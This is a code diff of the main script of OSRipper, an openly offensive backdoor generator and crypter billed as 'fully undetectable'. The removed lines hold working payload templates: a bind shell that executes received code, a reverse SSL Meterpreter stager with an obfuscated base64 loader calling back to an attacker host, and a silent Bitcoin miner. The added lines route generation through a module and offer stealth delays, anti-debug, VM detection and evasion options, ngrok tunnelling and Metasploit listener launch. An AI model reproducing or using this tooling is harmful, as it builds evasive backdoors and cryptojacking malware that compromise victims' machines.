@@ -1,29 +1,20 @@
 #!/usr/bin/env python3
 """
-OSRipper v0.3.1 - Advanced Payload Generator and Crypter
-Author: SubGlitch1
-License: MIT
-
+OSRipper - Advanced Payload Generator and Crypter
 A sophisticated, fully undetectable (FUD) backdoor generator and crypter
 that specializes in creating advanced payloads for penetration testing
 and red team operations.
+
+Version and author information are imported from the package __init__.py
 """
 
 import os
 import sys
 import socket
 import shutil
-import platform
-import secrets
-import string
-import random
 import subprocess
-import time
-from ripgrok import get_tunnels
-
-# Version info
-__version__ = "0.3.1"
-__author__ = "SubGlitch1"
+from .ripgrok import get_tunnels
+from . import __version__, __author__
 
 # Global variables
 bind = 0
@@ -41,7 +32,7 @@ def display_logo():
     """Display a modern logo."""
     logo = f"""
     ┌─────────────────────────────────────────────────────────────────────────────┐
-    │                           🏴‍☠️ OSRipper v{__version__} 🏴‍☠️                           │
+    │                            OSRipper v{__version__}                            │
     │                                                                             │
     │          ██████╗ ███████╗██████╗ ██╗██████╗ ██████╗ ███████╗██████╗         │
     │         ██╔═══██╗██╔════╝██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗        │
@@ -50,8 +41,8 @@ def display_logo():
     │         ╚██████╔╝███████║██║  ██║██║██║     ██║     ███████╗██║  ██║        │
     │          ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝        │
     │                                                                             │
-    │                    🚀 Advanced Payload Generator & Crypter                  │
-    │                           ⚡ Fully Undetectable (FUD)                       │
+    │                    Advanced Payload Generator & Crypter                    │
+    │                           Fully Undetectable (FUD)                         │
     │                                                                             │
     └─────────────────────────────────────────────────────────────────────────────┘
     """
@@ -61,26 +52,26 @@ def display_menu():
     """Display the main menu."""
     menu = f"""
     ┌─────────────────────────────────────────────────────────────────────────────┐
-    │                           🏴‍☠️ OSRipper v{__version__} Menu 🏴‍☠️                           │
+    │                           OSRipper v{__version__} Menu                           │
     ├─────────────────────────────────────────────────────────────────────────────┤
     │                                                                             │
-    │  1. 🔗 Create Bind Backdoor                                                 │
+    │  1. Create Bind Backdoor                                                   │
     │     └─ Opens a port on victim machine and waits for connection             │
     │                                                                             │
-    │  2. 🔐 Create Encrypted TCP Meterpreter (RECOMMENDED)                      │
+    │  2. Create Encrypted TCP Meterpreter (RECOMMENDED)                         │
     │     └─ Reverse connection with SSL/TLS encryption                          │
     │                                                                             │
-    │  3. 🎭 Crypt Custom Code                                                    │
+    │  3. Crypt Custom Code                                                      │
     │     └─ Obfuscate and encrypt existing Python scripts                       │
     │                                                                             │
     │  ═══════════════════════════════ Miners ═══════════════════════════════════ │
     │                                                                             │
-    │  4. ⛏️  Create Silent BTC Miner                                             │
+    │  4. Create Silent BTC Miner                                                │
     │     └─ Stealthy cryptocurrency mining payload                              │
     │                                                                             │
     │  ══════════════════════════ Staged Payloads ══════════════════════════════ │
     │                                                                             │
-    │  5. 🌐 Create Encrypted Meterpreter (Staged)                               │
+    │  5. Create Encrypted Meterpreter (Staged)                                  │
     │     └─ Multi-stage web delivery with enhanced stealth                      │
     │                                                                             │
     └─────────────────────────────────────────────────────────────────────────────┘
@@ -98,9 +89,19 @@ def validate_port(port_str):
 def validate_ip(ip):
     """Validate IP address."""
     try:
+        # Check that IP has exactly 4 octets
+        parts = ip.split('.')
+        if len(parts) != 4:
+            return False
+        # Validate each octet is a number between 0-255
+        for part in parts:
+            num = int(part)
+            if not (0 <= num <= 255):
+                return False
+        # Also use socket.inet_aton for additional validation
         socket.inet_aton(ip)
         return True
-    except socket.error:
+    except (socket.error, ValueError):
         return False
 
 def get_user_input(prompt, validator=None, error_msg="Invalid input"):
@@ -112,18 +113,10 @@ def get_user_input(prompt, validator=None, error_msg="Invalid input"):
                 continue
             if validator is None or validator(user_input):
                 return user_input
-            print(f"❌ {error_msg}")
+            print(f"[!] {error_msg}")
         except KeyboardInterrupt:
-            print("\n\n👋 Goodbye!")
+            print("\n\nGoodbye!")
             sys.exit(0)
-
-def generate_random_string(length):
-    """Generate random string for obfuscation."""
-    return "".join(secrets.choice(string.ascii_letters) for _ in range(length))
-
-def move_file_to_directory(file_path, destination_directory):
-    """Move file to destination directory."""
-    shutil.move(file_path, destination_directory)
 
 def listen(host, port):
     """Original listen function for bind backdoors."""
@@ -136,7 +129,7 @@ def listen(host, port):
     s.bind((SERVER_HOST, SERVER_PORT))
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     s.listen(5)
-    print(f"🎯 Listening as {SERVER_HOST}:{SERVER_PORT} ...")
+    print(f"[*] Listening as {SERVER_HOST}:{SERVER_PORT} ...")
 
     client_socket, client_address = s.accept()
     cwd = client_socket.recv(BUFFER_SIZE).decode()
@@ -159,8 +152,9 @@ def listen(host, port):
 def gen_bind():
     """Generate bind backdoor."""
     global port, bind, name
+    from .generator import create_bind_payload
     
-    print("\n🔗 Bind Backdoor Generator")
+    print("\nBind Backdoor Generator")
     print("─" * 40)
     
     name = "payload"
@@ -171,49 +165,28 @@ def gen_bind():
     )
     bind = "1"
     
-    payload_content = f"""port = {port}
-
-import zlib
-import base64
-import socket
-import struct
-import time
-
-def main():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.bind(('0.0.0.0', int(port)))
-        s.listen(1)
-        client, addr = s.accept()
-        
-        length = struct.unpack('>I', client.recv(4))[0]
-        data = client.recv(length)
-        
-        while len(data) < length:
-            data += client.recv(length - len(data))
-        
-        exec(zlib.decompress(base64.b64decode(data)), {{'s': client}})
-        
-    except Exception:
-        time.sleep(10)
-        main()
-
-if __name__ == "__main__":
-    main()
-"""
+    # Stealth delay option
+    stealth_delay = get_user_input(
+        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
     
-    with open(name, 'w') as f:
-        f.write(payload_content)
+    # Use centralized generator
+    create_bind_payload(port, name, stealth_delay=stealth_delay)
     
-    print(f"✅ Bind backdoor generated: {name}")
-    print(f"📡 Listening on port: {port}")
-    print("💡 Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
+    print(f"[+] Bind backdoor generated: {name}")
+    print(f"[*] Listening on port: {port}")
+    if stealth_delay:
+        print("[*] Stealth delay enabled (5-15 seconds)")
+    print("[i] Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
 
 def gen_rev_ssl_tcp():
     """Generate reverse SSL TCP meterpreter."""
     global name, host, port
+    from .generator import create_reverse_ssl_tcp_payload
     
-    print("\n🔐 Encrypted TCP Meterpreter Generator")
+    print("\nEncrypted TCP Meterpreter Generator")
     print("─" * 45)
     
     name = "payload"
@@ -231,7 +204,7 @@ def gen_rev_ssl_tcp():
             "Port must be between 1024 and 65535"
         )
         
-        print(f"🌐 Starting ngrok tunnel on port {port}")
+        print(f"[*] Starting ngrok tunnel on port {port}")
         print("Please run this command in another terminal:")
         print(f"   ngrok tcp {port}")
         input("Press Enter when ngrok is ready...")
@@ -239,9 +212,9 @@ def gen_rev_ssl_tcp():
         try:
             tunnel_info = get_tunnels()
             host, port = tunnel_info.split(":")
-            print(f"✅ Ngrok tunnel established: {host}:{port}")
+            print(f"[+] Ngrok tunnel established: {host}:{port}")
         except Exception as e:
-            print(f"❌ Ngrok setup failed: {e}")
+            print(f"[!] Ngrok setup failed: {e}")
             use_ngrok = False
     
     if not use_ngrok:
@@ -256,58 +229,27 @@ def gen_rev_ssl_tcp():
             "Port must be between 1024 and 65535"
         )
     
-    # Generate randomized variables
-    socket_var = generate_random_string(random.randint(8, 15))
-    ssl_var = generate_random_string(random.randint(8, 15))
-    length_var = generate_random_string(random.randint(8, 15))
-    data_var = generate_random_string(random.randint(8, 15))
-    host_var = generate_random_string(random.randint(8, 15))
-    port_var = generate_random_string(random.randint(8, 15))
-    sleep_time = secrets.randbelow(12)
+    # Stealth delay option
+    stealth_delay = get_user_input(
+        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
     
-    payload_content = f"""{port_var} = {port}
-{host_var} = "{host}"
-
-import zlib
-import base64
-import socket
-import ssl
-import struct
-import time
-
-# Obfuscated payload loader
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'=ESU5q7A/7DdkvrebXNmTCl0aQAahglRAHgygYSP4mGC0u004WcTeF6+Qszx2bv93KGrVtpLqNylLSpXZbDmD5QwKTguST+/cRw+L92xJrWtPpjqP31zZjuJI2KZiuudWB8cxqU/45/VeUbsqwbJdtBEAtvdddtYXdfOmHFZNSUDIaMALA4XZmnsIXZthvUMG71u9ym3UUFLTPia3LLsIEbLb7GdegSnDo2x6unE2gf1v4Khk8ypBn5zMLjU2tk363fCRnwY2CTypnnakhRIsCm+f8mYPwRiPDNAAA0Q2ldwFwJe'))
-
-for x in range(10):
-    try:
-        {socket_var} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        {socket_var}.connect(({host_var}, {port_var}))
-        {ssl_var} = ssl.wrap_socket({socket_var})
-        break
-    except:
-        time.sleep({sleep_time})
-
-{length_var} = struct.unpack('>I', {ssl_var}.recv(4))[0]
-{data_var} = {ssl_var}.recv({length_var})
-
-while len({data_var}) < {length_var}:
-    {data_var} += {ssl_var}.recv({length_var} - len({data_var}))
-
-exec(zlib.decompress(base64.b64decode({data_var})), {{'s': {ssl_var}}})
-"""
+    # Use centralized generator
+    create_reverse_ssl_tcp_payload(host, port, name, stealth_delay=stealth_delay)
     
-    with open(name, 'w') as f:
-        f.write(payload_content)
-    
-    print(f"✅ Reverse TCP meterpreter generated: {name}")
-    print(f"📡 Callback: {host}:{port}")
+    print(f"[+] Reverse TCP meterpreter generated: {name}")
+    print(f"[*] Callback: {host}:{port}")
+    if stealth_delay:
+        print("[*] Stealth delay enabled (5-15 seconds)")
 
 def gen_custom():
     """Generate custom crypter."""
     global name
+    from .generator import create_custom_payload
     
-    print("\n🎭 Custom Code Crypter")
+    print("\nCustom Code Crypter")
     print("─" * 25)
     
     script_path = get_user_input(
@@ -318,17 +260,26 @@ def gen_custom():
     
     name = "payload"
     
-    with open(script_path, 'r') as source:
-        with open(name, 'w') as target:
-            target.write(source.read())
+    # Stealth delay option
+    stealth_delay = get_user_input(
+        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
     
-    print(f"✅ Custom script processed: {name}")
+    # Use centralized generator
+    create_custom_payload(script_path, name, stealth_delay=stealth_delay)
+    
+    print(f"[+] Custom script processed: {name}")
+    if stealth_delay:
+        print("[*] Stealth delay enabled (5-15 seconds)")
 
 def gen_btc_miner():
     """Generate Bitcoin miner."""
     global name
+    from .generator import create_btc_miner_payload
     
-    print("\n⛏️  Silent BTC Miner Generator")
+    print("\nSilent BTC Miner Generator")
     print("─" * 35)
     
     name = "payload"
@@ -338,93 +289,27 @@ def gen_btc_miner():
         "Invalid Bitcoin address format"
     )
     
-    miner_code = f'''
-import socket
-import json
-import hashlib
-import binascii
-import time
-import random
-
-def main():
-    address = "{btc_address}"
-    nonce = hex(random.randint(0, 2**32-1))[2:].zfill(8)
+    # Stealth delay option
+    stealth_delay = get_user_input(
+        "Add stealth delay (5-15 seconds) at startup? (y/n): ",
+        lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+        "Please enter 'y' or 'n'"
+    ).lower() in ['y', 'yes']
     
-    host = 'solo.ckpool.org'
-    port = 3333
+    # Use centralized generator
+    create_btc_miner_payload(btc_address, name, stealth_delay=stealth_delay)
     
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((host, port))
-        
-        # Server connection
-        sock.sendall(b'{{"id": 1, "method": "mining.subscribe", "params": []}}\n')
-        lines = sock.recv(1024).decode().split('\n')
-        response = json.loads(lines[0])
-        sub_details, extranonce1, extranonce2_size = response['result']
-        
-        # Authorize worker
-        auth_msg = f'{{"params": ["{btc_address}", "password"], "id": 2, "method": "mining.authorize"}}\n'
-        sock.sendall(auth_msg.encode())
-        
-        # Mining loop
-        response = b''
-        while response.count(b'\n') < 4 and not(b'mining.notify' in response):
-            response += sock.recv(1024)
-        
-        responses = [json.loads(res) for res in response.decode().split('\n') 
-                    if len(res.strip()) > 0 and 'mining.notify' in res]
-        
-        if responses:
-            job_id, prevhash, coinb1, coinb2, merkle_branch, version, nbits, ntime, clean_jobs = responses[0]['params']
-            
-            # Calculate target and mine
-            target = (nbits[2:] + '00' * (int(nbits[:2], 16) - 3)).zfill(64)
-            extranonce2 = '00' * extranonce2_size
-            
-            coinbase = coinb1 + extranonce1 + extranonce2 + coinb2
-            coinbase_hash_bin = hashlib.sha256(hashlib.sha256(binascii.unhexlify(coinbase)).digest()).digest()
-            
-            merkle_root = coinbase_hash_bin
-            for h in merkle_branch:
-                merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(h)).digest()).digest()
-            
-            merkle_root = binascii.hexlify(merkle_root).decode()
-            merkle_root = ''.join([merkle_root[i:i+2] for i in range(0, len(merkle_root), 2)][::-1])
-            
-            blockheader = version + prevhash + merkle_root + nbits + ntime + nonce + \
-                '000000800000000000000000000000000000000000000000000000000000000000000000000000000000000080020000'
-            
-            hash_result = hashlib.sha256(hashlib.sha256(binascii.unhexlify(blockheader)).digest()).digest()
-            hash_hex = binascii.hexlify(hash_result).decode()
-            
-            if hash_hex < target:
-                payload = f'{{"params": ["{btc_address}", "{job_id}", "{extranonce2}", "{ntime}", "{nonce}"], "id": 1, "method": "mining.submit"}}\n'
-                sock.sendall(payload.encode())
-        
-        sock.close()
-        
-    except Exception:
-        time.sleep(10)
-        main()
-
-if __name__ == "__main__":
-    while True:
-        main()
-'''
-    
-    with open(name, 'w') as f:
-        f.write(miner_code)
-    
-    print(f"✅ BTC miner generated: {name}")
-    print(f"💰 Payout address: {btc_address}")
-    print("📊 Monitor at: https://solo.ckpool.org/")
+    print(f"[+] BTC miner generated: {name}")
+    print(f"[*] Payout address: {btc_address}")
+    if stealth_delay:
+        print("[*] Stealth delay enabled (5-15 seconds)")
+    print("[i] Monitor at: https://solo.ckpool.org/")
 
 def postgen():
     """Handle post-generation options."""
     global encrypted
     
-    print("\n🔧 Post-Generation Options")
+    print("\nPost-Generation Options")
     print("─" * 30)
     
     # Obfuscation
@@ -434,14 +319,14 @@ def postgen():
         "Please enter 'y' or 'n'"
     ).lower() in ['y', 'yes']
     
+    # Enhanced obfuscation (only if obfuscation is enabled)
+    enhanced_obfuscation = False
     if obfuscate:
-        try:
-            import obfuscator
-            encrypted = True
-            obfuscator.MainMenu(name)
-            print("✅ Payload obfuscated successfully")
-        except Exception as e:
-            print(f"❌ Obfuscation failed: {e}")
+        enhanced_obfuscation = get_user_input(
+            "Use enhanced obfuscator? (anti-debug, VM detection, advanced evasion) (y/n): ",
+            lambda x: x.lower() in ['y', 'n', 'yes', 'no'],
+            "Please enter 'y' or 'n'"
+        ).lower() in ['y', 'yes']
     
     # Compilation
     compile_binary = get_user_input(
@@ -450,58 +335,48 @@ def postgen():
         "Please enter 'y' or 'n'"
     ).lower() in ['y', 'yes']
     
-    if compile_binary:
-        compile_payload()
-
-def compile_payload():
-    """Compile payload to binary."""
-    try:
-        os.makedirs("dist", exist_ok=True)
-        
-        icon_path = input("Enter .ico path for custom icon (or press Enter for default): ").strip()
-        source_file = f"{name}_or.py" if encrypted else f"{name}.py"
-        
-        cmd_parts = [
-            "python3", "-m", "nuitka",
-            "--standalone",
-            "--include-module=sandboxed",
-            "--disable-console",
-            "--windows-disable-console",
-            "--onefile",
-            "--assume-yes-for-downloads"
-        ]
-        
-        if platform.system() == "Darwin":
-            cmd_parts.append("--macos-create-app-bundle")
-            if icon_path and os.path.exists(icon_path):
-                cmd_parts.append(f"--macos-onefile-icon={icon_path}")
-        
-        if icon_path and os.path.exists(icon_path) and platform.system() != "Darwin":
-            cmd_parts.append(f"--windows-icon-from-ico={icon_path}")
-        
-        cmd_parts.append(source_file)
-        
-        print("🔨 Compiling payload...")
-        result = subprocess.run(cmd_parts, capture_output=True, text=True)
-        
-        if result.returncode == 0:
-            print("✅ Compilation successful!")
-            print("📁 Binary saved in: dist/")
-        else:
-            print("❌ Compilation failed")
-            print(f"Error: {result.stderr}")
+    # Use Generator for obfuscation and/or compilation
+    if obfuscate or compile_binary:
+        try:
+            from .generator import Generator
             
-    except Exception as e:
-        print(f"❌ Compilation error: {e}")
+            # Get icon path if compiling
+            icon_path = None
+            if compile_binary:
+                icon_input = input("Enter .ico path for custom icon (or press Enter for default): ").strip()
+                if icon_input and os.path.exists(icon_input):
+                    icon_path = icon_input
+            
+            # Initialize generator
+            source_file = f"{name}.py" if os.path.exists(f"{name}.py") else name
+            generator = Generator(source_file, name, icon_path)
+            
+            # Run generation
+            success = generator.generate(
+                obfuscate=obfuscate,
+                compile_binary=compile_binary,
+                enhanced_obfuscation=enhanced_obfuscation
+            )
+            
+            if success:
+                encrypted = obfuscate
+            else:
+                print("[!] Generation failed")
+                
+        except Exception as e:
+            print(f"[!] Generation error: {e}")
+            import traceback
+            traceback.print_exc()
+
 
 def start_web_server(webroot):
     """Start web server for staged payloads."""
     try:
         cmd = ["python3", "-m", "http.server", "8000", "--directory", webroot]
         subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print("🌐 Web server started in background on port 8000")
+        print("[*] Web server started in background on port 8000")
     except Exception as e:
-        print(f"❌ Failed to start web server: {e}")
+        print(f"[!] Failed to start web server: {e}")
 
 def webdelivery():
     """Create web delivery dropper."""
@@ -533,7 +408,7 @@ if __name__ == "__main__":
     
     # Obfuscate dropper
     try:
-        import obfuscator
+        from . import obfuscator
         obfuscator.MainMenu("dropper.py")
     except Exception:
         pass
@@ -547,26 +422,17 @@ if __name__ == "__main__":
     except Exception:
         pass
 
-def cleanup():
-    """Clean up temporary files."""
-    try:
-        temp_files = [f"{name}.py", f"{name}_or.py", f"{name}_or.spec", "dropper.py", "dropper_or.py", "tmp.txt"]
-        for file in temp_files:
-            if os.path.exists(file):
-                os.remove(file)
-    except Exception:
-        pass
 
 def start_listener():
     """Start Metasploit listener."""
     if not bind and host and port:
         try:
-            print("🎯 Starting Metasploit listener...")
+            print("[*] Starting Metasploit listener...")
             cmd = f"msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'"
             os.system(cmd)
         except Exception as e:
-            print(f"❌ Failed to start listener: {e}")
-            print(f"💡 Manually run: msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'")
+            print(f"[!] Failed to start listener: {e}")
+            print(f"[i] Manually run: msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {port}; exploit'")
 
 def main():
     """Main application."""
@@ -576,18 +442,17 @@ def main():
         display_menu()
         
         choice = get_user_input(
-            "\n🎯 Select module (1-5): ",
+            "\n[?] Select module (1-5): ",
             lambda x: x in ['1', '2', '3', '4', '5'],
             "Please select a valid option (1-5)"
         )
         
-        print(f"\n🚀 Executing module {choice}...")
+        print(f"\n[*] Executing module {choice}...")
         
         if choice == '1':
             gen_bind()
             postgen()
-            cleanup()
-            print("\n💡 Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
+            print("\n[i] Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
             
         elif choice == '2':
             gen_rev_ssl_tcp()
@@ -616,20 +481,20 @@ def main():
             start_web_server("webroot")
             start_listener()
         
-        print("\n✅ Operation completed successfully!")
-        print("📁 Check the 'dist' directory for your files")
+        print("\n[+] Operation completed successfully!")
+        print("[*] Check the 'results' directory for your files")
         
     except KeyboardInterrupt:
-        print("\n\n👋 Operation cancelled by user")
+        print("\n\nOperation cancelled by user")
     except Exception as e:
-        print(f"\n❌ Unexpected error: {e}")
+        print(f"\n[!] Unexpected error: {e}")
     finally:
-        print("\n🏴‍☠️ Thanks for using OSRipper!")
+        print("\nThanks for using OSRipper!")
 
 if __name__ == "__main__":
     # Check Python version
     if sys.version_info < (3, 6):
-        print("❌ Python 3.6 or higher is required")
+        print("[!] Python 3.6 or higher is required")
         sys.exit(1)
     
     main()
